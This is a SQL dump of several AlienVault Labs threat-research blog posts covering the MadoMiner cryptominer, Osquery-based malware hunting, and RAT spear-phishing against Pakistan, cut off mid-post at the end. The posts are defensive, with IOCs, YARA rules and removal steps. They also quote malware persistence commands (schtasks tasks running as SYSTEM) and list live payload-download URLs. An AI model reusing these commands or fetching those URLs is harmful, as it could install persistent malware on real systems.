INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (4, 'MadoMiner Part 1 - Install', 'James Quinn', 'September 24, 2018 ', '2018 seems to be a time for highly profitable cryptominers that spread over SMB file-shares.  Following my analysis on ZombieBoy in July, I found a new malware sample that I’m calling MadoMiner.  With the help of Chris Doman, I was able to analyze it to discover that it uses techniques similar to ZombieBoy, because it hijacks Zombieboy’s CPUINFO.exe. However, MadoMiner is much, much, larger, in terms of:The size of the malware;The amount of systems infected; andTotal profit gained by the attackers.The previously analysed ZombieBoy was earning around $750 a month, while mining at its maximum power.  MadoMiner, on the other hand, is earning around $6015 a month, while only mining at 50% power:Malware AnalysisAn overview of the Install module is below.  Depending on the victim’s architecture, obtained from CPUInfo.exe, either x86.dll or x64.dll is installed:X86.dll and x64.dll are virtually identical just one is specifically for x86-x64 OS architecture and one is specifically for x86 OS architecture.DomainsMadoMiner appears to use two different servers to distribute payloads for each module.http://da[dot]alibuf.com:3/http://bmw[dot]hobuff.info:3/In addition, in Mask.exe, the second module, here are some identified mining servers used by MadoMiner:http://gle[dot]freebuf.infohttp://etc[dot]freebuf.infohttp://xmr[dot]freebuf.infohttp://xt[dot]freebuf.infohttp://boy[dot]freebuf.infohttp://liang[dot]alibuf.comhttp://dns[dot]alibuf.comhttp://x[dot]alibuf.comExploitsDuring the execution of the Install module, MadoMiner makes use of several exploits:CVE-2017-9073, RDP vulnerability on Windows XP and Windows Server 2003CVE-2017-0143, SMB exploitCVE-2017-0146, SMB exploitInstallationMadoMiner begins on a victim’s computer as a DLL installed by the EternalBlue/DoublePulsar exploits. Depending on OS architecture, you’ll either find x86.dll or x64.dll installed on your computer.  Both are basically the same, just adjusted for operating system.Just like ZombieBoy, MadoMiner makes use of a heavily modified version of ZombieBoyTools in order to install its DLL.  The reason for this it seems, is that the CPUInfo.exe dropped by the Install module of MadoMiner appears to be the same CPUInfo.exe dropped by an earlier version of 64.exe, a module from ZombieBoy (similar to current day CPUInfo in ZombieBoy, sans embedded miner and anti-VM guards).In fact, if CPUInfo.exe in MadoMiner is ran without the surrounding Install module, it will attempt to communicate with ZombieBoy’s servers and ultimately install ZombieBoyPacket showing malware communicating to ca[dot]posthash.org:443SetupOnce either x86.dll or x64.dll is successfully installed and executed on  a victim’s computer, several actions are performed.  First, 2 UPX packed modules are downloaded from da[dot]alibuf.info, known locally as Install.exe and Mask.exe(for x86.dll, 445.exe & mado.exe; for x64.dll, mask.exe & dst.exe). These modules are both executed concurrently and are in charge of all functionality of the malware.Install.exeInstall.exe is a curious module.  Installed to ‘C:\\%Windows Directory%\\Install.exe’ from either http://da[dot]alibuf.com:3/445.exe or http://da[dot]alibuf.com:3/mask.exe, Install.exe seems to be in charge of spreading MadoMiner to more systems. MadoMiner spreads to other systems by hijacking ZombieBoy’s CPUInfo.exe.  Install.exe consists of a couple batch scripts for persistence and evasion, a dropper, CPUInfo.exe, and 2 dlls, x86.dll and x64.dll.  What MadoMiner does with these dll’s and CPUInfo.exe is particularly unique.  CPUInfo.exe on its own drops over 70+ files to IIS, including the 2 dll’s that it installs on computers, x86.dll and x64.dll. In its base form, these dll’s contain the ZombieBoy installation.  MadoMiner writes over CPUInfo.exe’s x86.dll and x64.dll with its own dlls.  When CPUInfo.exe goes to install the dlls, it installs MadoMiner’s dlls instead!Install.exe also runs 2 tasks for persistence, RavTask and GooglePingInConfigs.  The first task,  RavTask, and runs every 4 hours, indefinitely.  RavTask runs a batch file dropped by Install.exe called Free.bat that will be discussed more below.  GooglePingInConfigs’ job is simple; all it has to do is run CPUInfo.exe at startup. The commands for starting Ravtask and GooglePingInConfigs are as follows:‘@schtasks /create /sc minute /mo 240 /tn “RavTask /tr “C:\\windows\\IIS\\free.bat” /ru “system” /f’‘@schtasks /create /tn “GooglePinginConfigs” /tr “C:\\Windows\\IIS\\CPUInfo.exe” /sc onstart /ru “system” /f’Install.exe batch scriptsInstall.exe has 3 batch scripts that it uses in its runthrough.  Free.bat, DemO.bat, DemC.bat.  Dem(open) or Demo.bat is used at the beginning, when Install.exe is first launched, Free.bat is used by RavTask, and Dem(close) or DemC.bat is used at the end of install.exe’s runthrough.DemO first sets a task named Schedule to autorun.  Next, it deletes and then recreates the 2 tasks used for Persistence --- Ravtask and GooglePingInConfigs.  Finally, access is removed from RavTask and GooglePingInConfigs, RavTask is run, and then the script deletes itself.\nDemO.batFree.bat, which is executed by RavTask every 4 hours, is a small batch script with a fairly important job.  First, Free.bat ends any of the programs/dlls used by CPUInfo.exe including DoublePulsar and EternalBlue(This is done to guarantee a clean start).  Next, Free.bat runs GooglePingInConfigs (which will execute CPUInfo.exe).  In addition, Free.bat also checks to make sure the NIC is up by pinging it.Free.batFinally, DemC is ran to hide the malware and appears to be a partial wiper module.  For example, if the malware detects a VM, DemC is ran.  DemC closes a lot of open processes, in addition to deleting some of the modules dropped by MadoMiner.  Also, DemC deletes all executables in the ProgramData folder.x64 and x86 - The Hijacking Dllsx64.dll and x86.dll start their journey packed into Install.exe.  When Install.exe is ran however, they are dropped in C:\\Windows\\IIS with CPUInfo.exe, however when attempting to access either x86.dll or x64.dll, access is denied.  This is so that CPUInfo.exe does not overwrite x86.dll and x64.dll while executing. As for the dll’s themselves, they each have a check to determine that you are indeed their respective OS type.  If so, they download their specific malware (mask.exe and dst.exe for x64.dll;445.exe and mado.exe for x86.dll) from their download server and run WinExec to run the applications.x86.dll urldown functionCPUInfo.exe - The Hijacked malwareCPUInfo.exe is very similar to the CPUInfo.exe used by ZombieBoy.  In fact, I believe it to be an earlier version of CPUInfo.exe before ZombieBoy packed the miner with CPUInfo.exe and made it impossible to run on a VM(Running CPUInfo.exe without running Install.exe first causes ZombieBoy to be dropped).  Just like in ZombieBoy, CPUInfo.exe drops over 70+ files into C:\\Windows\\IIS.  These files contain the exploits used, ZombieBoyTools, the web scanner, a copy of CPUInfo.exe, the 2 dlls used to spread (x86.dll and x64.dll).In addition, CPUInfo.exe appears to have some keylogger functionalities, just like in ZombieBoy.  A static strings analysis shows that CPUInfo.exe imports a lot of commands used for keylogging, such as SetWindowHookEx and GetKeyState.CPUInfo.exe is the main payload of Install.exe and all of the other files in Install.exe seem to support CPUInfo in one way or another.  As we’ve seen, x64.dll and x86.dll are both used to spread MadoMiner, but how it all comes together is quite interesting.CPUInfo.exe - RunthroughWhen CPUInfo first launches, it connects to ip[dot]3322.net  in order to obtain the public IP netrange. Next, CPUInfo.exe obtains regional info about the host using www[dot]ip138.com. As this is happening, CPUInfo.exe is also unpacking itself, dropping a total of 3 exploits, a web scanner, the batch scripts for scanning the files, as well as necessary dll’s and other misc files adding up to over 70 files into C:\\windows\\IIS.  After dropping the necessary files and obtaining the IP netrange, CPUInfo.exe begins to use the lightweight TCP web scanner, WinEggDrop, in order to scan all private IP’s from XXX.XXX.0.0 - XXX.XXX.255.255 to identify an IP with port 445 open.  If said IP is located, this ip is extracted and saved into com.dll for future use and then a heavily modified version of ZombieBoyTools is ran.  This version of ZombieBoyTools identifies the OS architecture and then, using either EternalBlue/DouplePulsar or EternalChampion/DoublePulsar, installs and executes either x86.dll or x64.dll(after extracting the saved IPs from com.dll).  This starts the infection process on a new host, running and downloading the Install and Mask modules.Batch script to scan Private IP’s.After finishing the private IP infection stage, CPUInfo.exe then moves onto the private IP infection stage, which is nearly identical to the public IP infection stage, except that CPUInfo.exe does not need to obtain the private IP again, since the value is already saved in memory.  When scanning the private IP, it also follows the same scan pattern as the public IP scan.Avoidance and Removal - Install.exeInstall.exe uses several NSA exploits, just like ZombieBoy.  In fact, if your computer is patched for ZombieBoy, you’ll also be patched for MadoMiner.  Specifically, the patch that will protect you from MadoMiner is MS17-010.  In addition, you’ll want to block traffic to the following web servers (ip’s are subject to change unfortunately, so I’ve provided the alphanumeric address instead):http://alibuf[dot]com:3/ (distribution server)http://hobuff[dot]info:3/ (Distribution server)http://freebuf.info (Mining server)While I always advocate avoidance as the best practice sometimes that just isn’t possible.  As always, if you become infected by MadoMiner, do not panic.  However, you should backup any important files now, if you haven\'t already.  MadoMiner has a nasty trap that when CPUInfo closes, it sometimes triggers demC.bat, which is Install.exe’s wiper module, in which it deletes any suspicious files for anti-analysis.The key deleted/changed files/settings are:Remove ownership from ftp.exeDelete host file and then remake it, saving “127.0.0.1 localhost” to itFlush dnsDelete several services that may be from past campaigns.Delete all executable files in C:\\%ProgramData%\\Make C:\\Progra~1\\dllStop all running modules from MadoMinerIn addition, MadoMiner appears to take advantage of the IFEO.  Anytime the modules are executed, taskkill.exe /f is ran as a debugger, killing the moduleIn addition, unless you use port 445, all traffic into and out of it should be blocked.While I am including a chart with all of the installed modules of MadoMiner in total, the amount of files installed by both are too large to fit into one analysis, so in this part I will cover in depth the steps to remove Install.exe.Note:  This requires safe mode! One of CPUInfo.exe’s batch files will delete a lot of files in ProgramData, in addition to other important files on CPUInfo.exe’s close.  Be careful, and back up any important files before attempting this.  Since MadoMiner installs 2 jobs, those jobs will need to be deleted from either HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\Taskcache\\Tasks or HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\Taskcache\\Tree.  The jobs are known as RavTask and GooglePingInConfigs.In addition, if you open Task Scheduler and go to the scheduled tasks, you should delete the “action” field from the jobs, so that they are rendered null and void.Also, you should delete DemC.bat and DemO.bat from C:\\%WindowsDirectory%\\ along with Install.exe and \\IIS. You should then be able to run your favorite Antivirus software in order to scan for any remaining artifacts.DetectionYara Rulerule MadoMiner_Install\n\n{\n\n            meta:\n\n                        author = “[email protected]\n\n                        reference = \"https://www.virustotal.com/#/file/1a90dbc1db60930614a1e78b9ecfff4d772d48c4d08e9c66986b695316253062/\" \n\n            strings:\n\n                        $string_1 = \"d09f2340818511d396f6aaf844c7e325\" nocase wide ascii\n\n                        $string_2 = \"tem.vbs\" nocase wide ascii\n\n                        $string_3 = \'taskkill /f /t /im CPUInfo.exe\' nocase wide ascii\n\n                        $string_4 = \'@taskkill /f /t /im svshostr.exe\' nocase wide ascii\n\n                        $string_5 = \'@Wmic Process Where \"Name=\'cmd.exe\' And ExecutablePath=\'C:\\\\ProgramData\\\\Microsoft\\\\Natihial\\\\cmd.exe\'\" Call Terminate\' nocase wide ascii\n\n            condition:\n\n                        all of them\n\n}\n\nrule MadoMiner_Install_CpuInfo\n\n{\n\n            meta:\n\n                        author = “[email protected]\n\n                        reference = “https://www.virustotal.com/#/file/9b5223806c1662084d0cdaf98b040d4b205c7dd8ad2a997e7debc8287ea1825f/detection”\n\n            Strings:\n\n                        $string_1 = “epykkfnx” nocase wide ascii\n\n                        $string_2 = \"ahwsresh\" nocase wide ascii\n\n                        Condition:\n\n                        all of them\n\n}\n\nrule MadoMiner_Install_x64dll\n\n{\n\nmeta:\n\n                        author = “[email protected]\n\n                        reference = “https://www.virustotal.com/#/file/2480b6faef77e7446bae9630a7bcb403c5aa94e97ccb9f28db83e8476ae57093/detection”\n\n            Strings:\n\n                        $string_1 = \"http://da.alibuf.com:3/dst.exe\" nocase wide ascii\n\n                        $string_2 = \"http://da.alibuf.com:3/mask.exe\" nocase wide ascii\n\n            Condition:\n\n                        All of them\n\n}\n\nrule MadoMiner_Install_x86dll\n\n{\n\n            meta:\n\n                        author = “[email protected]\n\n                        reference = “https://www.virustotal.com/#/file/f534fcd5a3648c77811f2986cc6da9460ad7d913f1c3f0829656bb0e6c2628bb/detection”\n\n            strings:\n\n                        $string_1 = “http://da.alibuf.com:3/mado.exe” nocase wide ascii\n\n                        $string_2 = “http://da.alibuf.com:3/445.exe” nocase wide ascii\n\n            condition: all of them\n\n}Indicators of Compromise Samples MD5 Size IP IOCx86.dll[first x86 installed dll]69833a3ecc52f57a02656d46e1799dcc70.7 KBhttp://da[dot]alibuf.com:3/-x64.dll[first x64 installed dll]e9c6bf0de42aa2449f1ed4bbb50ddcd639.4 KBhttp://da[dot]alibuf.com:3/-445.exe [x86 Install.exe]3c720a55b043564313000a4efb1d85c06.4 MBIp[dot]3322.netwww[dot]ip138.comC:\\Windows\\Install.exeC:\\Windows\\IIS\\*C:\\Windows\\DemO.batC:\\Windows\\DemC.BatMado.exe [ x86 Mask.exe]4ae31911c1ef2ca4eded1fdbaa2c7a49741.0 KBgle[dot]frebuf.info:80Bmw[dot]hobuff.info:3“C:\\Windows\\Fonts\\svchost.exe”“C:\\Windows\\Fonts\\rundllhost.exe”“HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog”“HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceMaims”“HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceMais”Mask.exe [ x64 Install.exe]d8470f5c12f5a5fee89de4d4c425d6141.3 MBIp[dot]3322.netwww[dot]ip138.comC:\\Windows\\Install.exeC:\\Windows\\IISC:\\Windows\\DemO.batC:\\Windows\\DemC.BatDst.exe [ x64 Mask.exe]4ae31911c1ef2ca4eded1fdbaa2c7a49741.1kbgle[dot]frebuf.info:80BMW[dot]hobuff.info:3/“C:\\Windows\\Fonts\\svchost.exe”“HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog”“HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceMaims”“HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceMais”CPUInfo.exe2df2d6d9db08558e88f1636ed2acc1465.7 MBIp[dot]3322.netwww[dot]ip138.comC:\\Windows\\IIS\\CPUInfo.exeSogou.exe [ 2nd module file]4a14e7fb274462e844b55952103504004.6 MBIp[dot]3322.netwww[dot]ip138.comC:\\Windows\\Installer\\conhost.exe360Safe.exe [2nd Module File]ce606d80b44ea2aae81056b9088ba1e43.6 MBgle[dot]freebuf.info:80C:\\Windows\\Fonts\\rundllhost.exe', 'malware researchmalware huntingcryptominingmadominer', '/blogs/labs-research/madominer-part-1-install');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (5, 'Malware Analysis using Osquery Part 2', 'Javier Ruiz', 'September 6, 2018 ', 'In the first part of this series, we saw how you can use Osquery to analyze and extract valuable information about malware’s behavior. In that post, we followed the activity of the known Emotet loader, popular for distributing banking trojans. Using Osquery, we were able to discover how it infects a system using a malicious Microsoft Office document and how it extracts and executes the payload.In this post, we are going to see another common technique that malware uses persistence. To do so, we will continue using Osquery to explore the registry and startup_items tables.Registry PersistenceIn this case, we will analyze a piece of malware built using the .NET framework, in particular a sample of Shrug ransomware. This malware encrypts users\' personal documents and requests an amount of Bitcoins to get all files restored back.https://otx.alienvault.com/indicator/file/a554b92036fbbc1c5d1a7d8a4049b01c5b6b7b30f06843fcdccf1f2420dfd707Opening the sample with a .NET debugger, we can see that it first creates a new file in the user temp directory and writes a new value in the “CurrentVersion\\Run” registry key for the user space pointing to that file. The malware will be executed every time the user logs on. This is a common persistence mechanism that malware droppers use in order to stay in the system.If we run the sample in our Osquery environment, we can easily detect this activity using a couple of queries. For example, if you remember the query we used to log files written on disk in Part 1 of this blog series, we can also use it here to detect the file planted on user temp directory. We are just searching for files written on Users directories in the last 100 seconds.Additionally, we can search for the new entry created in the registry hive. For that, we can use the ‘registry’ Osquery table, which allows us to query all the registry entries in the system.  We can also use the ‘startup_items’ table. This second table contains a set of predefined paths that the system uses to run programs automatically at startup. Running the following query, we can see how the malware has written a new entry, pointing to the ‘shrug.exe’ file discovered with the first query.The file shrug.exe is also written on .NET framework, so we can open it again with the debugger and see some interesting parts. This file first checks if the system is already infected. If not, it creates a new registry key with the same name to write the installation parameters.https://otx.alienvault.com/indicator/file/b14a57ad391d9ba5b2714dad4773118f118ed8d64b523466bb60f3b18336efc1This time we can use the registry table to see if any new entry has been created in the registry. By running a query to search for any new keys created in the HKEY_USERS hive in the last 100 seconds, as we did previously for files, we can see the new “Shrug” key.To see if any values have been added into that key, we can use the key path to search the registry table. Querying the previous key path, we obtain the installation parameters used by the ransomware to store data like installation date, victim identifier, and also the key and the Initialization Vector (IV) used for encrypting files.After the registry installation, Shrug ransomware sends some data to the domain stored in the address variable. This connection can be discovered by running a query similar to that one used in the Part 1 blog post to see the communication to the Command and Control server.Finally, as ransomware usually does, it tries to encrypt all of the user’s personal documents. In this case, we can see in the previous image how it starts encrypting the whole “C:\\\\” directory. Fortunately, this activity causes the files to change their modification timestamp, allowing us to query all files that have been modified recently. The query will return all files modified by the ransomware, and as we can see, they all have a new file extension “.SHRUG”.Scheduled tasks and servicesAnother common way to gain persistence on Windows systems is to create scheduled tasks or install new services. These actions are often performed by malware, and Osquery has tables to query them.Here is an example of OilRig malware. As you can see in the table below, two new scheduled tasks have been created after running the sample. Osquery can give us this information by querying the scheduled_tasks table.The services table allows us to see which services have been installed in the system. After running a malware sample that installs a malicious service to gain persistence, we can build a query to return these results and see all details about the new service. As you can see we have detected the service “Check for updates” executing a malicious PowerShell script.How AlienVault uses OsqueryBy using Osquery we can detect a lot of mechanisms and techniques frequently used by malware threats. In the previous blog post, we saw how to analyze a malware infection, stage by stage. In this post, we have seen how it is possible to catch persistence tricks. This can be extremely helpful during the investigation of security incidents as well as threat hunting activities on your critical assets.AlienVault leverages Osquery through the AlienVault Agent to enable threat hunting in both USM Anywhere and the Open Threat Exchange. The AlienVault Agent is a lightweight, adaptable endpoint agent based on Osquery and maintained by AlienVault. In USM Anywhere, the AlienVault Agent enables continuous endpoint monitoring, using the built-in AlienVault threat intelligence to automate endpoint queries and threat detection alongside your other network and cloud security events. This allows USM Anywhere to deliver endpoint detection and response (EDR), file integrity monitoring (FIM), and rich endpoint telemetry capabilities that are essential for complete and effective threat detection, response, and compliance.Try it for yourself in the USM Anywhere Online Demo.In April, AlienVault introduced the Endpoint Threat Hunter  – a free threat-scanning service in Open Threat Exchange® (OTX™) based on the AlienVault Agent. OTX Endpoint Threat Hunter allows anyone to determine if their endpoints are infected with the latest malware or other threats by manually scanning their endpoints for the presence of indicators of compromise (IoCs) that are catalogued in OTX.Get started with OTX Endpoint Threat Hunter Free: https://otx.alienvault.com/endpoint-threat-hunter/welcomeAppendixOsquery searchesselect path, size from file where path like \'C:\\Users\\%%\' and mtime > (select local_time from time) - 100\n\nand filename != \'.\';\n\n\nselect source, name, path from startup_items;\n\n\nselect path, name, type, data from registry where path like \'HKEY_USERS\\%\\%%\' and mtime > (select local_time from time) - 100;\n\n\nselect path, name, type, data from registry where key like \'HKEY_USERS\\%\\Shrug\';\n\n\nselect name, action, path, enabled, next_run_time from scheduled_tasks;\n\n\nselect name, display_name, start_type, path, user_account from services; Sample IOCs  https://otx.alienvault.com/pulse/5b899bd8694f420825bbdfddConnectionshttp://tempacc11vl.000webhostapp[.]com/marthas_stuff/uploadhash.php145.14.145.119FilesShrugInstaller.exea554b92036fbbc1c5d1a7d8a4049b01c5b6b7b30f06843fcdccf1f2420dfd707Dropped executable fileC:\\Users\\admin\\AppData\\Local\\Temp\\shrug.exeb14a57ad391d9ba5b2714dad4773118f118ed8d64b523466bb60f3b18336efc1  Yaraimport \"dotnet\"\n\n\nrule ShrugRansomware {\n\n            meta:\n\n                        author = \"AlienVault Labs\"\n\n            strings:\n\n                        $bitcoin_address = \"1Hr1grgH9ViEgUx73iRRJLVKH3PFjUteNx\"\n\n                        $s1 = \"upoldhash.php\"\n\n                        $s2 = \"HarmedFiles\"\n\n                        $s3 = \"ShrugDecryptor\"\n\n                        $s4 = \"SHRUG2\"\n\n                        $pdb1 = \"\\\\Debug\\\\ShrugTwo.pdb\"\n\n                        $pdb2 = \"\\\\Debug\\\\Shrug.pdb\"\n\n\n            condition:\n\n                        uint16(0) == 0x5A4D and dotnet.number_of_guids > 0 and \n\n                        ((dotnet.typelib == \"a6ab6b1f-b144-4920-be42-bb90ec6fc22e\") \n\n                        or ($bitcoin_address) \n\n                        or (2 of ($s*)) \n\n                        or (any of ($pdb*)))\n}', 'usm anywhereosquerymalware analysis', '/blogs/labs-research/malware-analysis-using-osquery-part-2');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (6, 'Off-the-shelf RATs Targeting Pakistan', 'Jose Manuel Martin', 'August 1, 2018 ', 'IntroductionWe’ve identified a number of spear phishing campaigns with Pakistani themed documents, likely targeting the region. These spear phishing emails use a mix of different openly available malware and document exploits for delivery. These are served from the compromised domains www.serrurier-secours[.]be and careers.fwo.com[.]pk (a part of the Pakistani army). There are some clear trends in the themes of the decoy documents the attackers chose to include with file names such as:China-Pakistan-Internet-Security-LAW_2017.docStrategic Thinking on Ensuring Ideological.docxFazaia_Housing_Scheme_Notice_Inviting_Tenders.docPAFs first multinational air exercise ACES Meet 2017 concludes in Pakistan.docIDUF-01.docPakistan Air Force Jet Crashes During Routine Operation Sales_Tax.docHajj Policy and Plan 2017.docSummaryThe first document we (and others) analysed contains a list with names of officers who are being promoted in the Pakistan Atomic Energy Commission:This is probably a targeted attack, with a very few number of spam emails delivered to a selected bunch of people. Although the document is dated on December 2017, we’ve seen related malware dating back to June 2017. A number of these documents have been previously identified by users on Twitter.We were surprised to find these documents drop a mix of low quality rats such as Pony and Netwire - normally more associated with ameteur attacks against banking credentials than something more targeted. As we’ve seen previously, the usage of openly available malware makes attribution difficult.AnalysisWhen opened, the document drops several files. Among them, an encapsulated PostScript, identified by 6f3beaca4f864a15ac5eb70391a5e9e3. The corrupted EPS tries to exploit CVE-2015-2545, which allows an attacker to execute arbitrary code allocated inside an EPS header.In this case, the code they are trying to execute is the payload identified as c97a22cbc20c1f2237e649abee8c92fb. This is a DLL file containing a malicious remote access tool. Its capabilities include sandbox evasion, local privilege escalation and remote code execution in the infected machine.The packet also loads multiple system functions, commonly found in Windows malware families, allowing:Processes and files creation/destruction.Extract system information.Take system snapshots.Networking capabilities.Privileges escalation.The payload check for the system version, to find out if it is vulnerable to either remote code execution or local privilege escalation. The process flow found in the scene seems to exploit CVE-2016-7255. This exploits, which allows privilege escalation on a Windows machine, is triggered by a win32k.sys call to NtSetWindowLongPtr, for the index GWLP_ID on a window handler with WS_CHILD value on GWL_STYLE attribute. This vulnerability became very popular on November 2016, after hacker group APT28 used it to perform targeted attacks. The flow of the main escalation privileges thread is described in the picture.The program uses a call to cmd.exe /k whoami, to verify whether the RCE has worked. The final payload dropped is a sample containing the infamous Netwire RAT. We found similar purpose packages dropped by some of the other documents mentioned. The attack pattern and some other indicators, like domain names, look similar to the Revenge RAT campaign analyzed by RSA Link security researchers.DetectionWe detect the malware used in these attacks in a number of ways across the host and the network.Agent DetectionsThe AlienVault Agent is a lightweight, adaptable endpoint agent based on osquery and maintained by AlienVault. In USM Anywhere, the AlienVault Agent enables continuous endpoint monitoring, using the built-in AlienVault threat intelligence to automate endpoint queries and threat detection alongside your other network and cloud security events. This allows USM Anywhere to deliver endpoint detection and response (EDR), file integrity monitoring (FIM), and rich endpoint telemetry capabilities that are essential for complete and effective threat detection, response, and compliance.The AlienVault Agent detects the following malicious activity during the attacks:Suspicious Process Created by Microsoft Office ApplicationCore Windows Executable launched from Wrong PathNetwork Detection RulesETPRO TROJAN NetWireRAT Keep-AliveETPRO TROJAN NetWire VariantETPRO TROJAN Netwire RAT Check-inETPRO TROJAN Fareit/Pony Downloader CnC responseETPRO TROJAN Fareit/Pony Variant CnC BeaconETPRO TROJAN MSIL/Revenge-RAT CnC CheckinET POLICY PE EXE or DLL Windows file download HTTPET INFO EXE IsDebuggerPresent (Used in Malware Anti-Debugging)USM Anywhere Correlation RulesDetect this malware activity with the following correlation rules:System Compromise - Malware Infection - Remote Access TrojanSystem Compromise - Malware Infection - DownloaderSystem Compromise - Malware Infection - DropperSystem Compromise - Malware Infection - TrojanThanks to Chris Doman and Javvad Malik for collaboration.AppendixRelated analysis by users on Twitterhttps://twitter.com/securitydoggo/status/926144466674647041https://twitter.com/avman1995/status/905694140788219904https://twitter.com/ImPureMotion/status/906216798986670080File-Hashes027E4C6C51E315F0E49F3644AF08479303A747ED55ECBA5AA0AE75C27CD6EFEB81E518E094D597965F578F6F42C22C363450E8FB8D33C0A9568254CA048C15E6096012A5A9CF483FE0BDCD5A1030CC4D85B8E5296609FDC3632F2337A897A394291CA9E4AA9DB88635A89CB58F8DBF49E60ABDDBBCEC1C4A611EF4192BFC6D242BE03E829856AD2FF772BA1F5074D4EAFBF3ECAB8D97794D1CC6589E043E3A282E219FC95D7B44D8B0E748628E559A9EC79A068B90FE162B192DAA8CF8D6F3EE40E9287FF8828FB0E6BAEDCFF873E8E35520C6227200F1C84B63446F07A5928948463E268ACB50FFBCB27EAFF46F757486A985FFC2D10F35AE1B9422660A20D24BA13ADD1AA8AE3FFFCB83F9B0990A6CD8B8912FC0E26811D0211F72AAAA7C7982CE7DFFEF284571CA21EB240869148B7F3583D9CB95EBDC42C77536DCCC9060855AD4DCB9C5502D6EF73528704046CACF006770FD4AF23259CB33E7577CD205F110283C4E459CC20E908267D88EDBA26E2135BCB7D7335CABBED1A128EDEB86A70CACC8BFFFC4A67171122FC424ED95FC3F89BC592D7489AACC666E5834F571A8FA4C806D97E59DB0C42B574558A68942EADFE56286A66D90A8F6248A34CF43URLshttp://careers.fwo.com[.]pk/css/microsoftdm.exehttp://careers.fwo.com[.]pk/css/printer.exehttp://sandipuniversity.edu[.]in/list/87_Copy.docxhttp://www.serrurier-secours[.]be/.../China-Pakistan-Internet-Security-LAW_2017.dochttp://www.serrurier-secours[.]be/.../PAF%e2%80%99s%20first%20multinational%20air%20exercise%20ACES%20Meet%202017%20concludes%20in%20Pakistan.dochttps://www.serrurier-secours[.]be/.../Fazaia_Housing_Scheme_Notice_Inviting_Tenders.dochttps://www.serrurier-secours[.]be/.../Hajj%20Policy%20and%20Plan%202017.dochttps://www.serrurier-secours[.]be/.../Pakistan%20Air%20Force%20Jet%20Crashes%20During%20Routine%20Operation.dochttps://www.serrurier-secours[.]be/.../Sales%20-%20Tax%20&ampDomains0x0.ignorelist[.]comYara Rulerule Pakistan_atomic_comission_dropped_dll   {   meta:   description = \"Pakistani Atomic Energy Commission Spearphishing dropped DLL\"   author = \"Jose M Martin\"   date = \"2018/07/10\"   hash = \"027e4c6c51e315f0e49f3644af08479303a747ed55ecba5aa0ae75c27cd6efeb\"   strings:   $s1 = \"ExploitTagMenuState start\" fullword ascii   $s2 = \"ExploitTagMenuState end\" fullword ascii   $s3 = \"DonorThread start\" fullword ascii   $s4 = \"EscalateThread start\" fullword ascii   $s5 = \"EscalatePrivilegesOld start\" fullword ascii   $s6 = \"EscalatePrivilegesWow\" fullword ascii   condition:uint16(0) == 0x5A4D and filesize < 30KB and (any of them)}', 'otxmalware huntingrat trojanmalware analysis', '/blogs/labs-research/off-the-shelf-rats-targeting-pakistan');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (7, 'Malware Analysis using Osquery Part 1', 'Javier Ruiz', 'July 31, 2018 ', 'Tools like Sysmon and Osquery are useful in detecting anomalous behavior on endpoints. These tools give us good visibility of what’s happening on endpoints by logging multiple types of events, which we can forward to a SIEM or other correlation system for analysis.In this blog series, we’ll analyze different malware families, looking at the types of events generated on the endpoint and how we can use Osquery to detect them.Let\'s start!Let’s start by analyzing the famous Emotet Banking Trojan, which is a continuous threat that targets a lot of countries and company sectors (The Evolution of Emotet). The dropper spreads through email phishing and downloads the malware using a malicious Office macro.File samples:https://app.any.run/tasks/b30d3215-a238-415e-ba7d-a884e1505758https://www.virustotal.com/#/file/c932d54a9ef3c645a28b7d8de9747fc6c06fc23c6d65c036da4eae4d778a81dbAs we can see in the sandbox report, the Office macro executes PowerShell with an encoded command to download the payload.If we run the sample in our environment with Osquery installed, we can build a query to retrieve events generated by PowerShell from the powershell_events table. Osquery reads the Microsoft-Windows-PowerShell eventlog channel, so you need to enable Script block logging.We can see the encoded PowerShell command and also the script text code generated after decoding the command.Once PowerShell is downloading the payload, Osquery can log socket connections opened by any process. We can do an easy JOIN between process_open_socket table and processes table to see which processes are making network connections.It’s interesting to see which files have been written on disk during the payload download. To do so, we can query the file table that stores some useful fields (file table schema). This table needs a WHERE condition to return results, so we can add some filters like Users directory and files created in the last 100 seconds for example.The downloaded file from PowerShell is a Emotet dropper that extracts the final payload and executes it (squarectx.exe). Now, let’s query the system running processes. Similar to above, we can do a JOIN with users table to see the username column. Some rows have been omitted for a cleaner view.Now we know that Emotet malware is running in our environment and probably is doing malicious things, so let’s look for signs of malware activity. For that, we reuse the query we used above to see network connections from system processes. Here, we can detect communication to the Command and Control server.As we have seen, it is possible to analyze malware and extract valuable information using tools like Osquery that give us rich visibility of systems events.How AlienVault uses OsqueryOsquery allows you to retrieve a wealth of events and useful information from your endpoints. This can be extremely helpful for investigating security incidents as well as threat hunting activities on your critical assets.AlienVault leverages Osquery through the AlienVault Agent to enable threat hunting in both USM Anywhere and the Open Threat Exchange.  The AlienVault Agent is a lightweight, adaptable endpoint agent based on Osquery and maintained by AlienVault. In USM Anywhere, the AlienVault Agent enables continuous endpoint monitoring, using the built-in AlienVault threat intelligence to automate endpoint queries and threat detection alongside your other network and cloud security events. This allows USM Anywhere to deliver endpoint detection and response (EDR), file integrity monitoring (FIM), and rich endpoint telemetry capabilities that are essential for complete and effective threat detection, response, and compliance.Try it for yourself in the USM Anywhere Online Demo.In April, AlienVault introduced the Endpoint Threat Hunter  – a free threat-scanning service in Open Threat Exchange® (OTX™) based on the AlienVault Agent. OTX Endpoint Threat Hunter allows anyone to determine if their endpoints are infected with the latest malware or other threats by manually scanning their endpoints for the presence of indicators of compromise (IoCs) that are catalogued in OTX.Get started with OTX Endpoint Threat Hunter Free: https://otx.alienvault.com/endpoint-threat-hunter/welcomeHere is an example of how we detected Emotet infection on an analysis system using OTX Endpoint Threat Hunter.In the next posts of this blog series, we will see other malware families and 